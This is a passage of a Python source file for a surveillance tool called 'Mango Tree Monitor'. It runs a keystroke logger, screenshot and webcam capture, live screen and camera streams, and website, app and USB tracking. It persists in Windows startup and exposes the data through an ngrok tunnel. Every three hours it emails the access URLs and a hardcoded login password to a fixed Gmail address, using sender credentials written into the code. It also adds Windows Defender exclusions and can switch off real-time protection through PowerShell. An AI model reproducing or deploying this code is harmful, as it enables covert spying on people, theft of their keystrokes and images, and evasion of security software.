        activities = activities[:20]
        
        return jsonify({'activities': activities})
    except Exception as e:
        logger.error(f"Error getting recent activity: {str(e)}")
        return jsonify({'activities': []})

@app.route('/api/dashboard/latest_captures')
@login_required
def api_dashboard_latest_captures():
    """Get latest screenshots and webcam captures"""
    try:
        captures = []
        
        # Get latest screenshots
        screenshots_dir = os.path.join('logs', 'screenshots')
        if os.path.exists(screenshots_dir):
            screenshots = []
            for filename in os.listdir(screenshots_dir):
                if filename.endswith(('.png', '.jpg')):
                    path = os.path.join('static', 'screenshots', filename)
                    timestamp = filename.replace('screenshot_', '').replace('.png', '').replace('.jpg', '')
                    try:
                        dt = datetime.strptime(timestamp, '%Y%m%d_%H%M%S')
                        screenshots.append({
                            'type': 'screenshot',
                            'url': path,
                            'timestamp': dt.strftime('%Y-%m-%d %H:%M:%S')
                        })
                    except:
                        continue
            screenshots.sort(key=lambda x: x['timestamp'], reverse=True)
            captures.extend(screenshots[:5])
        
        # Get latest webcam captures
        webcam_dir = 'WebcamLogs'
        if os.path.exists(webcam_dir):
            webcam_captures = []
            for filename in os.listdir(webcam_dir):
                if filename.endswith(('.jpg', '.png')):
                    path = os.path.join('static', 'webcam', filename)
                    timestamp = filename.replace('capture_', '').replace('.jpg', '').replace('.png', '')
                    try:
                        dt = datetime.strptime(timestamp, '%Y-%m-%d_%H-%M-%S')
                        webcam_captures.append({
                            'type': 'webcam',
                            'url': path,
                            'timestamp': dt.strftime('%Y-%m-%d %H:%M:%S')
                        })
                    except:
                        continue
            webcam_captures.sort(key=lambda x: x['timestamp'], reverse=True)
            captures.extend(webcam_captures[:5])
        
        # Sort all captures by timestamp
        captures.sort(key=lambda x: x['timestamp'], reverse=True)
        captures = captures[:10]
        
        return jsonify({'captures': captures})
    except Exception as e:
        logger.error(f"Error getting latest captures: {str(e)}")
        return jsonify({'captures': []})

@app.route('/api/audio/devices')
@login_required
def get_audio_devices():
    """Get available audio input devices"""
    if not audio_monitor:
        return jsonify({'devices': []})
    devices = audio_monitor.get_available_devices()
    return jsonify({'devices': devices})

@app.route('/api/audio/device', methods=['POST'])
@login_required
def set_audio_device():
    """Set audio input device"""
    if not audio_monitor:
        return "Audio monitor not initialized", 500
    
    data = request.get_json()
    device_index = data.get('device_index')
    if device_index is None:
        return "Device index required", 400
        
    success = audio_monitor.set_device(device_index)
    return jsonify({'success': success})

@app.route('/api/audio/level')
@login_required
def get_audio_level():
    """Get current audio input level"""
    if not audio_monitor:
        return jsonify({'level': 0})
    level = audio_monitor.get_audio_level()
    return jsonify({'level': level})

@app.route('/api/audio/toggle', methods=['POST'])
@login_required
def toggle_audio():
    """Toggle audio recording"""
    if not audio_monitor:
        return "Audio monitor not initialized", 500
        
    data = request.get_json()
    enabled = data.get('enabled', False)
    
    if enabled:
        success = audio_monitor.start_recording()
    else:
        audio_monitor.stop_recording()
        success = True
        
    return jsonify({'success': success})

@app.route('/live/screen_feed')
@login_required
def screen_feed():
    """Stream screen feed"""
    if not live_monitor:
        return "Live monitor not initialized", 500
    return Response(
        live_monitor.generate_screen_frames(),
        mimetype='multipart/x-mixed-replace; boundary=frame'
    )

@app.route('/live/camera_feed')
@login_required
def camera_feed():
    """Stream webcam feed"""
    if not live_monitor:
        return "Live monitor not initialized", 500
    return Response(
        live_monitor.generate_camera_frames(),
        mimetype='multipart/x-mixed-replace; boundary=frame'
    )

@app.route('/api/camera/toggle', methods=['POST'])
@login_required
def toggle_camera():
    """Toggle camera feed on/off"""
    if not live_monitor:
        return jsonify({'success': False, 'error': 'Live monitor not initialized'}), 500
    try:
        data = request.get_json()
        enabled = data.get('enabled', False)
        success = live_monitor.set_camera_enabled(enabled)
        return jsonify({'success': success})
    except Exception as e:
        logger.error(f"Error toggling camera: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/static/screenshots/<path:filename>')
def serve_screenshot(filename):
    return send_from_directory(os.path.join('logs', 'screenshots'), filename)

@app.route('/static/webcam/<path:filename>')
def serve_webcam(filename):
    return send_from_directory('WebcamLogs', filename)

def start_flask(host, port):
    """Start Flask server with proper network binding"""
    try:
        # Enable threaded mode and bind to all interfaces (0.0.0.0)
        # This ensures the server is accessible from both local network and ngrok
        app.run(
            host='0.0.0.0',  # Bind to all available interfaces
            port=port,
            debug=False,
            use_reloader=False,
            threaded=True,
            processes=1
        )
    except Exception as e:
        logger.error(f"Failed to start server on {host}:{port} - {str(e)}")
        try:
            # Try localhost as fallback
            app.run(
                host='127.0.0.1',
                port=port,
                debug=False,
                use_reloader=False,
                threaded=True,
                processes=1
            )
        except Exception as e:
            logger.error(f"Failed to start server on localhost: {str(e)}")

def send_monitor_email(config, ngrok_url, local_ips):
    """Send monitor details email with access URLs"""
    try:
        print("\n📧 Sending access details email...")
        
        # Create message
        msg = MIMEMultipart()
        msg['From'] = EMAIL_CONFIG['sender_email']
        msg['To'] = EMAIL_CONFIG['notification_email']
        msg['Subject'] = f"Monitor Access Details - {config['username']}"

        # Create email body with HTML formatting
        body = f"""
<html>
<body style="font-family: Arial, sans-serif; line-height: 1.6;">
    <h2 style="color: #2c3e50;">Monitor Access Details</h2>
    <hr>
    
    <h3 style="color: #34495e;">Basic Information:</h3>
    <ul>
        <li><strong>Monitor Name:</strong> {config['username']}</li>
        <li><strong>Start Time:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</li>
    </ul>

    <h3 style="color: #34495e;">Access URLs:</h3>
    <div style="background-color: #f8f9fa; padding: 15px; border-radius: 5px;">
        <p><strong>Remote Access</strong> (Works from anywhere):<br>
        <span style="color: #2980b9;">{ngrok_url if ngrok_url else 'Remote access not available'}</span></p>

        <p><strong>Local Access:</strong><br>
        <span style="color: #2980b9;">http://localhost:{config['port']}</span></p>
    </div>

    <h3 style="color: #34495e;">Other Network Addresses:</h3>
    <div style="background-color: #f8f9fa; padding: 15px; border-radius: 5px;">
        {'<br>'.join([f'<span style="color: #2980b9;">http://{ip}:{config["port"]}</span>' for ip in local_ips if not ip.startswith('127.')])}
    </div>

    <h3 style="color: #34495e;">Login Information:</h3>
    <div style="background-color: #f8f9fa; padding: 15px; border-radius: 5px;">
        <p><strong>Password:</strong> happykutta</p>
    </div>

    <h3 style="color: #34495e;">Important Notes:</h3>
    <ul style="color: #7f8c8d;">
        <li>Remote access URL will change if monitor is restarted</li>
        <li>Local access URLs only work when on the same network</li>
        <li>Use Chrome, Firefox, or Edge browser</li>
    </ul>

    <hr>
    <p style="color: #95a5a6; font-size: 12px;">Powered by Mango Tree Technology</p>
</body>
</html>
"""

        # Attach HTML body
        msg.attach(MIMEText(body, 'html'))

        # Send with retries
        max_retries = 3
        for attempt in range(max_retries):
            try:
                print(f"  Sending email (attempt {attempt + 1}/{max_retries})...")
                
                # Connect to SMTP server with SSL from the start
                server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
                
                # Login with exact credentials
                server.login(
                    EMAIL_CONFIG['sender_email'],
                    EMAIL_CONFIG['app_password']
                )
                
                # Send email
                server.send_message(msg)
                server.quit()
                
                print("✓ Access details email sent successfully!")
                print(f"  Check {EMAIL_CONFIG['notification_email']} for access details")
                return True
                
            except Exception as e:
                print(f"✗ Email attempt {attempt + 1} failed: {str(e)}")
                if attempt < max_retries - 1:
                    print("  Retrying in 2 seconds...")
                    time.sleep(2)
                else:
                    print("✗ All email attempts failed")
                    print("  Please check your email settings:")
                    print(f"  - Sender: {EMAIL_CONFIG['sender_email']}")
                    print(f"  - App Password: {EMAIL_CONFIG['app_password'][:4]}...{EMAIL_CONFIG['app_password'][-4:]}")
                    return False
        
        return False

    except Exception as e:
        print(f"✗ Failed to send email: {str(e)}")
        return False

# Email configuration
EMAIL_CONFIG = {
    'notification_email': 'getinfomonitor@gmail.com',  # Email that receives notifications
    'sender_email': 'monitorsend76@gmail.com',        # Email that sends notifications
    'app_password': 'tzmqlutxsiuzvaho'                # App password for sender email
}

def ensure_monitoring_files():
    """Create necessary log files and directories"""
    try:
        # Create logs directory
        if not os.path.exists('logs'):
            os.makedirs('logs')
        
        # Create required log files
        log_files = [
            'window_log.txt',
            'website_log.txt',
            'internet_log.txt',
            'app_usage_log.txt',
            'keystrokes_current.txt',
            'usb_activity_log.txt'
        ]
        
        for filename in log_files:
            filepath = os.path.join('logs', filename)
            if not os.path.exists(filepath):
                with open(filepath, 'w', encoding='utf-8') as f:
                    f.write('')
                print(f"Created log file: {filename}")
        
        # Create required directories
        directories = [
            os.path.join('logs', 'screenshots'),
            os.path.join('logs', 'audio'),
            'WebcamLogs',
            os.path.join('static', 'screenshots'),
            os.path.join('static', 'webcam')
        ]
        
        for directory in directories:
            if not os.path.exists(directory):
                os.makedirs(directory)
                print(f"Created directory: {directory}")
        
        return True
    except Exception as e:
        print(f"Error creating monitoring files: {str(e)}")
        return False

def setup_ngrok(config):
    """Setup ngrok tunnel with robust error handling and token management"""
    import shutil
    import zipfile
    import urllib.request
    import subprocess
    import time
    import re
    import json
    
    try:
        # Check if ngrok token exists
        ngrok_token = config.get('ngrok_token')
        
        if not ngrok_token:
            print("\n🔑 Ngrok token not found")
            print("You can get your token from https://dashboard.ngrok.com/get-started/your-authtoken")
            ngrok_token = input("Enter your ngrok token (or press Enter to skip): ").strip()
            
            if ngrok_token:
                config['ngrok_token'] = ngrok_token
                save_config(config)
                print("✓ Ngrok token saved")
            else:
                print("⚠️ Skipping remote access setup")
                return None

        # Download ngrok.exe if not present
        ngrok_path = os.path.join(os.getcwd(), 'ngrok.exe')
        if not os.path.exists(ngrok_path):
            print("📥 Downloading ngrok...")
            try:
                # Try multiple download sources to bypass security restrictions
                download_urls = [
                    "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip",
                    "https://github.com/ngrok/ngrok/releases/download/v3.5.0/ngrok-v3.5.0-windows-amd64.zip",
                    "https://github.com/ngrok/ngrok/releases/download/v3.4.1/ngrok-v3.4.1-windows-amd64.zip"
                ]
                
                zip_path = os.path.join(os.getcwd(), 'ngrok.zip')
                download_success = False
                
                for url in download_urls:
                    try:
                        print(f"  Trying download from: {url}")
                        urllib.request.urlretrieve(url, zip_path)
                        download_success = True
                        print("  Download successful!")
                        break
                    except Exception as e:
                        print(f"  Failed from this source: {str(e)}")
                        continue
                
                if not download_success:
                    print("✗ All download sources failed")
                    return None
                
                print("  Extracting ngrok...")
                with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                    zip_ref.extractall(os.getcwd())
                
                os.remove(zip_path)
                print("✓ ngrok downloaded and extracted successfully")
                
                # Try to add Windows Defender exclusion (requires admin)
                try:
                    subprocess.run([
                        'powershell', '-Command', 
                        f'Add-MpPreference -ExclusionPath "{os.path.abspath(ngrok_path)}"'
                    ], capture_output=True, check=False)
                    print("✓ Added ngrok to Windows Defender exclusions")
                except:
                    print("⚠️ Could not add Windows Defender exclusion (run as admin)")
                    
            except Exception as e:
                print(f"✗ Failed to download ngrok: {str(e)}")
                return None
        else:
            print("✓ ngrok.exe already exists")

        # Set ngrok authtoken with multiple retry strategies
        print("🔐 Configuring ngrok with provided token...")
        auth_success = False
        
        # Strategy 1: Direct command
        try:
            result = subprocess.run([ngrok_path, 'config', 'add-authtoken', ngrok_token], 
                                  capture_output=True, text=True, check=True)
            print("✓ Ngrok token configured successfully")
            auth_success = True
        except subprocess.CalledProcessError as e:
            print(f"  Strategy 1 failed: {e.stderr}")
            
            # Strategy 2: Try with different flags
            try:
                result = subprocess.run([
                    ngrok_path, 'config', 'add-authtoken', ngrok_token, '--log=stdout'
                ], capture_output=True, text=True, check=True)
                print("✓ Ngrok token configured successfully (strategy 2)")
                auth_success = True
            except subprocess.CalledProcessError as e2:
                print(f"  Strategy 2 failed: {e2.stderr}")
                
                # Strategy 3: Try with PowerShell
                try:
                    result = subprocess.run([
                        'powershell', '-Command', 
                        f'& "{ngrok_path}" config add-authtoken "{ngrok_token}"'
                    ], capture_output=True, text=True, check=True)
                    print("✓ Ngrok token configured successfully (strategy 3)")
                    auth_success = True
                except subprocess.CalledProcessError as e3:
                    print(f"  Strategy 3 failed: {e3.stderr}")
        
        if not auth_success:
            print("⚠️ Could not configure ngrok token, but continuing...")

        # Start ngrok tunnel
        port = str(config['port'])
        print(f"🚀 Starting ngrok tunnel on port {port}...")
        
        # Kill any existing ngrok processes
        try:
            subprocess.run(['taskkill', '/f', '/im', 'ngrok.exe'], 
                         capture_output=True, check=False)
            time.sleep(2)
        except:
            pass
        
        # Start ngrok with multiple strategies
        ngrok_proc = None
        public_url = None
        
        # Strategy 1: Normal startup
        try:
            creationflags = subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
            ngrok_proc = subprocess.Popen([
                ngrok_path, 'http', port, 
                '--log=stdout', 
                '--log-format=json'
            ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
               creationflags=creationflags, text=True)
            print("✓ Ngrok started successfully")
        except Exception as e:
            print(f"  Strategy 1 failed: {str(e)}")
            
            # Strategy 2: Try with PowerShell
            try:
                ngrok_proc = subprocess.Popen([
                    'powershell', '-Command', 
                    f'& "{ngrok_path}" http {port} --log=stdout --log-format=json'
                ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                   creationflags=subprocess.CREATE_NO_WINDOW, text=True)
                print("✓ Ngrok started successfully (strategy 2)")
            except Exception as e2:
                print(f"  Strategy 2 failed: {str(e2)}")
                
                # Strategy 3: Try with cmd
                try:
                    ngrok_proc = subprocess.Popen([
                        'cmd', '/c', f'"{ngrok_path}" http {port} --log=stdout --log-format=json'
                    ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                       creationflags=subprocess.CREATE_NO_WINDOW, text=True)
                    print("✓ Ngrok started successfully (strategy 3)")
                except Exception as e3:
                    print(f"  Strategy 3 failed: {str(e3)}")
                    
                    # Strategy 4: Try with different execution flags
                    try:
                        ngrok_proc = subprocess.Popen([
                            ngrok_path, 'http', port, 
                            '--log=stdout', 
                            '--log-format=json'
                        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                           creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS, text=True)
                        print("✓ Ngrok started successfully (strategy 4)")
                    except Exception as e4:
                        print(f"  Strategy 4 failed: {str(e4)}")
                        
                        # Strategy 5: Try with shell=True
                        try:
                            ngrok_proc = subprocess.Popen(
                                f'"{ngrok_path}" http {port} --log=stdout --log-format=json',
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                                creationflags=subprocess.CREATE_NO_WINDOW, text=True, shell=True
                            )
                            print("✓ Ngrok started successfully (strategy 5)")
                        except Exception as e5:
                            print(f"  Strategy 5 failed: {str(e5)}")
                            return None
        
        if not ngrok_proc:
            print("✗ All startup strategies failed")
            return None
        
        print("  Waiting for ngrok to start...")
        max_wait = 60  # Wait up to 60 seconds
        
        for i in range(max_wait):
            if ngrok_proc.poll() is not None:
                # Process died
                stderr = ngrok_proc.stderr.read()
                print(f"✗ Ngrok process died: {stderr}")
                return None
            
            # Try to read from stdout
            line = ngrok_proc.stdout.readline()
            if line:
                line = line.strip()
                if line:
                    try:
                        # Try to parse as JSON
                        log_data = json.loads(line)
                        if 'url' in log_data:
                            public_url = log_data['url']
                            print(f"✓ Found ngrok URL: {public_url}")
                            break
                        elif 'msg' in log_data and 'url=' in log_data['msg']:
                            # Extract URL from message
                            match = re.search(r'url=(https://[a-zA-Z0-9\-\.]+\.ngrok-free\.app)', log_data['msg'])
                            if match:
                                public_url = match.group(1)
                                print(f"✓ Found ngrok URL: {public_url}")
                                break
                    except json.JSONDecodeError:
                        # Try regex on plain text
                        match = re.search(r'url=(https://[a-zA-Z0-9\-\.]+\.ngrok-free\.app)', line)
                        if match:
                            public_url = match.group(1)
                            print(f"✓ Found ngrok URL: {public_url}")
                            break
                        elif 'url=' in line:
                            # Try alternative patterns
                            patterns = [
                                r'https://[a-zA-Z0-9\-\.]+\.ngrok-free\.app',
                                r'https://[a-zA-Z0-9\-\.]+\.ngrok\.io',
                                r'https://[a-zA-Z0-9\-\.]+\.ngrok\.app'
                            ]
                            for pattern in patterns:
                                match = re.search(pattern, line)
                                if match:
                                    public_url = match.group(0)
                                    print(f"✓ Found ngrok URL: {public_url}")
                                    break
                            if public_url:
                                break
            
            time.sleep(1)
            if i % 10 == 0:
                print(f"  Still waiting... ({i+1}/{max_wait} seconds)")
        
        if not public_url:
            print("✗ Failed to get ngrok public URL after 60 seconds")
            print("  Checking ngrok status...")
            try:
                # Try to get URL from ngrok API
                import requests
                response = requests.get('http://localhost:4040/api/tunnels', timeout=5)
                if response.status_code == 200:
                    tunnels = response.json()
                    if tunnels and 'tunnels' in tunnels and tunnels['tunnels']:
                        public_url = tunnels['tunnels'][0]['public_url']
                        print(f"✓ Got URL from ngrok API: {public_url}")
                    else:
                        print("  No tunnels found in ngrok API")
                else:
                    print(f"  Ngrok API returned status: {response.status_code}")
            except Exception as e:
                print(f"  Could not access ngrok API: {str(e)}")
            
            if not public_url:
                ngrok_proc.terminate()
                return None
        
        print(f"✅ Ngrok tunnel established successfully!")
        print(f"   Public URL: {public_url}")
        
        # Return a tunnel object
        class Tunnel:
            def __init__(self, url, proc):
                self.public_url = url
                self.proc = proc
                
        return Tunnel(public_url, ngrok_proc)
        
    except Exception as e:
        print(f"✗ Error setting up ngrok: {str(e)}")
        return None

def add_to_startup():
    """Add this EXE to Windows startup (user level)"""
    import os
    import shutil
    try:
        if getattr(sys, 'frozen', False):  # Only do this for PyInstaller EXE
            exe_path = sys.executable
            startup_dir = os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\Start Menu\Programs\Startup')
            shortcut_path = os.path.join(startup_dir, 'MangoTreeMonitor.lnk')
            if not os.path.exists(shortcut_path):
                import pythoncom
                from win32com.shell import shell, shellcon
                from win32com.client import Dispatch
                shell = Dispatch('WScript.Shell')
                shortcut = shell.CreateShortCut(shortcut_path)
                shortcut.Targetpath = exe_path
                shortcut.WorkingDirectory = os.path.dirname(exe_path)
                shortcut.IconLocation = exe_path
                shortcut.save()
                print(f"✓ Added to startup: {shortcut_path}")
            else:
                print("Already in startup.")
    except Exception as e:
        print(f"Error adding to startup: {str(e)}")

def add_ngrok_exclusion_manual():
    """Provide instructions for manually adding ngrok to Windows Defender exclusions"""
    ngrok_path = os.path.abspath(os.path.join(os.getcwd(), 'ngrok.exe'))
    
    print("\n" + "="*60)
    print("🔧 MANUAL WINDOWS DEFENDER EXCLUSION SETUP")
    print("="*60)
    print("If ngrok is being blocked by Windows Defender, follow these steps:")
    print()
    print("1. Open Windows Security (Windows Defender)")
    print("2. Go to 'Virus & threat protection'")
    print("3. Click 'Manage settings' under 'Virus & threat protection settings'")
    print("4. Scroll down to 'Exclusions' and click 'Add or remove exclusions'")
    print("5. Click 'Add an exclusion' and select 'File'")
    print(f"6. Browse to and select: {ngrok_path}")
    print("7. Click 'Open' to add the exclusion")
    print("8. Restart this application")
    print()
    print("Alternative PowerShell command (run as Administrator):")
    print(f'Add-MpPreference -ExclusionPath "{ngrok_path}"')
    print()
    print("TEMPORARY DISABLE (Advanced users only):")
    print("Run PowerShell as Administrator and execute:")
    print("Set-MpPreference -DisableRealtimeMonitoring $true")
    print("(Remember to re-enable with: Set-MpPreference -DisableRealtimeMonitoring $false)")
    print("="*60)
    print()

def try_disable_defender_temporarily():
    """Try to temporarily disable Windows Defender real-time monitoring"""
    try:
        print("🛡️ Attempting to temporarily disable Windows Defender real-time monitoring...")
        result = subprocess.run([
            'powershell', '-Command', 
            'Set-MpPreference -DisableRealtimeMonitoring $true'
        ], capture_output=True, text=True, check=True)
        print("✓ Temporarily disabled Windows Defender real-time monitoring")
        return True
    except subprocess.CalledProcessError as e:
        print(f"✗ Failed to disable Windows Defender: {e.stderr}")
        print("  This requires Administrator privileges")
        return False
    except Exception as e:
        print(f"✗ Error: {str(e)}")
        return False

def re_enable_defender():
    """Re-enable Windows Defender real-time monitoring"""
    try:
        subprocess.run([
            'powershell', '-Command', 
            'Set-MpPreference -DisableRealtimeMonitoring $false'
        ], capture_output=True, text=True, check=False)
        print("✓ Re-enabled Windows Defender real-time monitoring")
    except:
        pass

def main():
    """Main function to start all monitoring components"""
    try:
        global live_monitor, audio_monitor, internet_monitor, screenshot_taker, webcam_capture
        global keystroke_logger, usb_monitor, app_tracker, activity_tracker, ngrok_tunnel
        
        print("\n" + "="*50)
        print("Starting Mango Tree Monitor")
        print("="*50)

        # Create necessary directories and log files
        try:
            ensure_log_directories()
            ensure_monitoring_files()
            print("✓ Created necessary directories and files")
        except Exception as e:
            print(f"✗ Failed to create directories: {str(e)}")
            return

        # Get user configuration
        config = get_user_config()
        if not config:
            print("✗ Setup cancelled or failed. Exiting...")
            return

        print("\n📋 Configuration loaded:")
        print(f"  Monitor Name: {config['username']}")
        print(f"  Port: {config['port']}")

        # Verify port is available
        if not test_port_available(config['port']):
            new_port = find_available_port(config['port'] + 1)
            if new_port:
                print(f"\n⚠️ Port {config['port']} is in use")
                print(f"  Switching to port {new_port}")
                config['port'] = new_port
                save_config(config)
            else:
                print("\n✗ No available ports found")
                print("  Please free up a port and try again")
                return

        # Add firewall rule
        try:
            if add_firewall_rule(config['port']):
                print("✓ Added firewall rule")
            else:
                print("⚠️ Failed to add firewall rule")
                print("  Monitor may not be accessible from other devices")
        except Exception as e:
            print(f"⚠️ Firewall error: {str(e)}")

        # Get local IP addresses
        local_ips = []
        try:
            for interface in netifaces.interfaces():
                addrs = netifaces.ifaddresses(interface)
                if netifaces.AF_INET in addrs:
                    for addr in addrs[netifaces.AF_INET]:
                        ip = addr['addr']
                        if not ip.startswith('127.'):
                            local_ips.append(ip)
            print("\n🌐 Network Addresses:")
            for ip in local_ips:
                print(f"  http://{ip}:{config['port']}")
        except Exception as e:
            print(f"⚠️ Error getting network addresses: {str(e)}")

        # Setup ngrok and get URL
        ngrok_tunnel = setup_ngrok(config)
        ngrok_url = ngrok_tunnel.public_url if ngrok_tunnel else None
        
        # If ngrok setup failed, show manual exclusion instructions
        if not ngrok_tunnel:
            print("\n⚠️ Ngrok setup failed. This might be due to Windows Defender blocking it.")
            add_ngrok_exclusion_manual()
            
            print("\nOptions:")
            print("1. Try ngrok setup again")
            print("2. Try temporarily disabling Windows Defender (requires admin)")
            print("3. Continue without ngrok")
            
            choice = input("Enter your choice (1/2/3): ").strip()
            
            if choice == '1':
                print("Retrying ngrok setup...")
                ngrok_tunnel = setup_ngrok(config)
                ngrok_url = ngrok_tunnel.public_url if ngrok_tunnel else None
            elif choice == '2':
                if try_disable_defender_temporarily():
                    print("Retrying ngrok setup with Windows Defender disabled...")
                    ngrok_tunnel = setup_ngrok(config)
                    ngrok_url = ngrok_tunnel.public_url if ngrok_tunnel else None
                    
                    # Re-enable Windows Defender after a delay
                    def re_enable_later():
                        import time
                        time.sleep(30)  # Wait 30 seconds
                        re_enable_defender()
                    
                    import threading
                    threading.Thread(target=re_enable_later, daemon=True).start()
                else:
                    print("Could not disable Windows Defender. Trying ngrok setup again...")
                    ngrok_tunnel = setup_ngrok(config)
                    ngrok_url = ngrok_tunnel.public_url if ngrok_tunnel else None
            else:
                print("Continuing without ngrok remote access...")

        # Send access details email
        if not send_monitor_email(config, ngrok_url, local_ips):
            response = input("Continue without sending email? (y/n): ")
            if response.lower() != 'y':
                return

        # Start periodic email thread (every 3 hours)
        def periodic_email():
            import time
            while True:
                time.sleep(3 * 60 * 60)  # 3 hours
                # Try to get the latest ngrok URL if possible
                url = ngrok_url
                if ngrok_tunnel and hasattr(ngrok_tunnel, 'public_url'):
                    url = ngrok_tunnel.public_url
                send_monitor_email(config, url, local_ips)
        import threading
        threading.Thread(target=periodic_email, daemon=True).start()

        # Add to startup if running as an EXE
        add_to_startup()

        print("\n🚀 Starting monitoring components...")

        # Start core monitoring components
        try:
            # Activity Tracker
            print("  Starting Activity Tracker...")
            activity_tracker = ActivityTracker()
            activity_tracker.start()
            print("    ✓ Activity Tracker started")

            # Website Tracker
            print("  Starting Website Tracker...")
            website_tracker = WebsiteTracker()
            website_tracker.start()
            print("    ✓ Website Tracker started")
        
            # Internet Monitor
            print("  Starting Internet Monitor...")
            internet_monitor = InternetMonitor()
            internet_monitor.start()
            print("    ✓ Internet Monitor started")

            # App Tracker
            print("  Starting App Tracker...")
            app_tracker = AppUsageTracker()
            app_tracker.start()
            print("    ✓ App Tracker started")
        
            # Keystroke Logger
            print("  Starting Keystroke Logger...")
            keystroke_logger = KeystrokeLoggerByApp()
            keystroke_logger.start()
            print("    ✓ Keystroke Logger started")

            # Screenshot Taker
            print("  Starting Screenshot Taker...")
            screenshot_taker = SmartScreenshotTaker()
            screenshot_thread = threading.Thread(target=screenshot_taker.start, daemon=True)
            screenshot_thread.start()
            print("    ✓ Screenshot Taker started")

            # USB Monitor
            print("  Starting USB Monitor...")
            usb_monitor = USBMonitorAdvanced()
            usb_monitor.start()
            print("    ✓ USB Monitor started")

            # Webcam Capture
            print("  Starting Webcam Capture...")
            webcam_capture = WebcamCapture()
            webcam_capture.start()
            print("    ✓ Webcam Capture started")

            # Live Monitor
            print("  Starting Live Monitor...")
            live_monitor = LiveMonitor()
            if live_monitor.start():
                print("    ✓ Live Monitor started")
            else:
                print("    ⚠️ Live Monitor failed to start")

            # Audio Monitor (Disabled)
            print("  Audio Monitor disabled")
            audio_monitor = None

        except Exception as e:
            print(f"\n✗ Failed to start components: {str(e)}")
            cleanup_and_exit()
            return

        # Start Flask server
        print("\n🌐 Starting web server...")
        try:
            flask_thread = threading.Thread(
                target=start_flask,
                args=('0.0.0.0', config['port']),
                daemon=True
            )
            flask_thread.start()
            print("✓ Web server started")
            
            # Print access information
            print("\n📱 Access Information:")
            print(f"  Local: http://localhost:{config['port']}")
            if ngrok_tunnel:
                print(f"  Remote: {ngrok_tunnel.public_url}")
            print("\n🔐 Login Information:")
            print("  Password: happykutta")
            
        except Exception as e:
            print(f"✗ Failed to start web server: {str(e)}")
            cleanup_and_exit()
            return

        print("\n✨ Monitor started successfully!")
        print("Press Ctrl+C to stop")
        
        # Keep the script running
        while True:
            time.sleep(60)
            
    except KeyboardInterrupt:
        print("\n\nShutting down gracefully...")
        cleanup_and_exit()
    except Exception as e:
        print(f"\n✗ Critical error: {str(e)}")
        cleanup_and_exit()

if __name__ == "__main__":
    try:
        # Set up signal handlers for graceful shutdown
        def signal_handler(signum, frame):
            logger.info("Received shutdown signal")
            cleanup_and_exit()
            
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        # Start the main application
        main() 
    except Exception as e:
        logger.error(f"Critical error in main execution: {str(e)}")
        cleanup_and_exit() 